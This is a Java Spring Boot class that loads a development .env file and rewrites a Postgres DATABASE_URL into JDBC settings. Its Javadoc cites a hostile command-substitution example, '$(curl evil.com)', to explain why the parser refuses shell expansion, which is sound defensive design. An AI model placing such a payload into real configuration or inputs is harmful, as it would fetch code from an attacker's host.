package com.trip.config;

import java.io.IOException;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.env.EnvironmentPostProcessor;
import org.springframework.core.env.ConfigurableEnvironment;
import org.springframework.core.env.MapPropertySource;

/**
 * Spring Boot {@link EnvironmentPostProcessor} that fixes up the environment before bean creation.
 * Two concerns, in order:
 *
 * <ol>
 *   <li><b>Dotenv loader</b> (dev-only). Reads a project-local <code>.env</code> file so
 *       <code>./gradlew bootRun</code> works without first doing
 *       <code>set -a &amp;&amp; source ../.env &amp;&amp; set +a</code>. Loaded values are added as
 *       the LOWEST-priority {@code PropertySource}, so OS env vars, JVM <code>-D</code> args, and
 *       profile-specific YAML always win. Skipped entirely when any active profile contains
 *       <code>"prod"</code> — defense in depth so a stray <code>.env</code> can't influence a
 *       deployed JVM.</li>
 *   <li><b>DATABASE_URL rewrite.</b> Neon (and most managed Postgres hosts) hand out connection
 *       strings as <code>postgresql://USER:PASS@HOST[:PORT]/DB?params</code>; Spring's JDBC layer
 *       wants <code>jdbc:postgresql://HOST[:PORT]/DB?params</code> with username and password as
 *       separate properties. We split it transparently so developers can paste the raw Neon URL.
 *       Values that already start with <code>jdbc:</code> pass through unchanged.</li>
 * </ol>
 *
 * <p><b>Order matters within this class.</b> The dotenv pass must run first so a file-supplied
 * <code>DATABASE_URL</code> is visible to the rewrite pass.
 *
 * <p><b>Dotenv parsing.</b> One <code>KEY=VALUE</code> per line. Blank and <code>#</code> comment
 * lines skipped. Single-quoted values are taken literally (POSIX semantics — no escapes). Double
 * quotes process a small set of escapes: <code>\"</code>, <code>\\</code>, <code>\n</code>,
 * <code>\r</code>, <code>\t</code>. Unquoted values take everything after the first <code>=</code>
 * with trailing whitespace stripped. We deliberately do NOT do shell-style variable expansion or
 * command substitution — that would let a malicious <code>.env</code> with
 * <code>$(curl evil.com)</code> execute on boot.
 */
public class BootEnvironmentProcessor implements EnvironmentPostProcessor {

    private static final String DOTENV_PROPERTY_SOURCE = "dotenvFile";
    private static final String DB_URL_PROPERTY_SOURCE = "databaseUrlExpansion";
    private static final Logger LOG = Logger.getLogger(BootEnvironmentProcessor.class.getName());

    @Override
    public void postProcessEnvironment(ConfigurableEnvironment env, SpringApplication app) {
        loadDotenvFile(env);
        rewriteDatabaseUrl(env);
    }

    // -- dotenv -----------------------------------------------------------------------------

    private static void loadDotenvFile(ConfigurableEnvironment env) {
        if (hasProdProfile(env.getActiveProfiles())) {
            return;
        }
        Path file = locateDotenv();
        if (file == null) {
            return;
        }
        List<String> lines;
        try {
            lines = Files.readAllLines(file);
        } catch (IOException e) {
            LOG.log(Level.WARNING, "Failed to read .env file at " + file + ": " + e.getMessage());
            return;
        }

        Map<String, Object> loaded = new HashMap<>();
        Set<String> loadedKeys = new LinkedHashSet<>();
        for (int i = 0; i < lines.size(); i++) {
            String raw = lines.get(i).strip();
            if (raw.isEmpty() || raw.startsWith("#")) {
                continue;
            }
            int eq = raw.indexOf('=');
            if (eq <= 0) {
                LOG.log(Level.FINE, "Skipping malformed .env line " + (i + 1) + " (no '=')");
                continue;
            }
            String key = raw.substring(0, eq).strip();
            if (key.isEmpty()) {
                LOG.log(Level.FINE, "Skipping malformed .env line " + (i + 1) + " (empty key)");
                continue;
            }
            // Already set by OS env, JVM args, or any prior PropertySource — explicit wins.
            if (env.getProperty(key) != null) {
                continue;
            }
            String value = parseValue(raw.substring(eq + 1));
            loaded.put(key, value);
            loadedKeys.add(key);
        }

        if (loaded.isEmpty()) {
            return;
        }
        env.getPropertySources().addLast(new MapPropertySource(DOTENV_PROPERTY_SOURCE, loaded));
        LOG.log(Level.INFO, "Loaded " + loaded.size() + " variables from " + file);
        LOG.log(Level.FINE, "Dotenv keys: " + loadedKeys);
    }

    private static boolean hasProdProfile(String[] profiles) {
        if (profiles == null) {
            return false;
        }
        for (String p : profiles) {
            if (p != null && p.toLowerCase(Locale.ROOT).contains("prod")) {
                return true;
            }
        }
        return false;
    }

    private static Path locateDotenv() {
        String cwd = System.getProperty("user.dir");
        if (cwd == null) {
            return null;
        }
        Path here = Paths.get(cwd, ".env");
        if (Files.isRegularFile(here)) {
            return here;
        }
        Path parent = Paths.get(cwd, "..", ".env").normalize();
        if (Files.isRegularFile(parent)) {
            return parent;
        }
        return null;
    }

    private static String parseValue(String rest) {
        // Strip only leading whitespace before quote detection so a quoted value with trailing
        // whitespace after the closing quote still parses as quoted.
        String trimmed = rest.stripLeading();
        if (trimmed.length() >= 2) {
            char first = trimmed.charAt(0);
            if (first == '\'' || first == '"') {
                int close = trimmed.lastIndexOf(first);
                if (close > 0) {
                    String inner = trimmed.substring(1, close);
                    return first == '\'' ? inner : unescapeDoubleQuoted(inner);
                }
            }
        }
        return trimmed.stripTrailing();
    }

    private static String unescapeDoubleQuoted(String s) {
        StringBuilder out = new StringBuilder(s.length());
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '\\' && i + 1 < s.length()) {
                char next = s.charAt(i + 1);
                switch (next) {
                    case '"': out.append('"'); i++; continue;
                    case '\\': out.append('\\'); i++; continue;
                    case 'n': out.append('\n'); i++; continue;
                    case 'r': out.append('\r'); i++; continue;
                    case 't': out.append('\t'); i++; continue;
                    default: out.append(c); continue;
                }
            }
            out.append(c);
        }
        return out.toString();
    }

    // -- DATABASE_URL rewrite ----------------------------------------------------------------

    private static void rewriteDatabaseUrl(ConfigurableEnvironment env) {
        String raw = env.getProperty("DATABASE_URL");
        if (raw == null || raw.isBlank()) {
            return;
        }
        if (raw.startsWith("jdbc:")) {
            // Already JDBC-flavored — trust the user.
            Map<String, Object> props = new HashMap<>();
            props.put("spring.datasource.url", raw);
            env.getPropertySources().addFirst(new MapPropertySource(DB_URL_PROPERTY_SOURCE, props));
            return;
        }
        if (!raw.startsWith("postgresql://") && !raw.startsWith("postgres://")) {
            // Unknown scheme — let Spring try and fail with its own clear error.
            return;
        }
        try {
            // URI won't parse the non-standard "postgresql" scheme cleanly in all JDKs, so
            // normalise to something URI understands then read the parts.
            String forUri = raw.replaceFirst("^postgres(ql)?://", "http://");
            URI u = URI.create(forUri);
            String userInfo = u.getUserInfo();
            String username = null;
            String password = null;
            if (userInfo != null) {
                int colon = userInfo.indexOf(':');
                if (colon >= 0) {
                    username = urlDecode(userInfo.substring(0, colon));
                    password = urlDecode(userInfo.substring(colon + 1));
                } else {
                    username = urlDecode(userInfo);
                }
            }
            StringBuilder jdbc = new StringBuilder("jdbc:postgresql://");
            jdbc.append(u.getHost());
            if (u.getPort() > 0) {
                jdbc.append(':').append(u.getPort());
            }
            if (u.getRawPath() != null) {
                jdbc.append(u.getRawPath());
            }
            if (u.getRawQuery() != null) {
                jdbc.append('?').append(u.getRawQuery());
            }

            Map<String, Object> props = new HashMap<>();
            props.put("spring.datasource.url", jdbc.toString());
            if (username != null) {
                props.put("spring.datasource.username", username);
            }
            if (password != null) {
                props.put("spring.datasource.password", password);
            }
            env.getPropertySources().addFirst(new MapPropertySource(DB_URL_PROPERTY_SOURCE, props));
        } catch (IllegalArgumentException ignored) {
            // Bad URL — fall through; Spring will surface the error.
        }
    }

    private static String urlDecode(String s) {
        return java.net.URLDecoder.decode(s, java.nio.charset.StandardCharsets.UTF_8);
    }
}
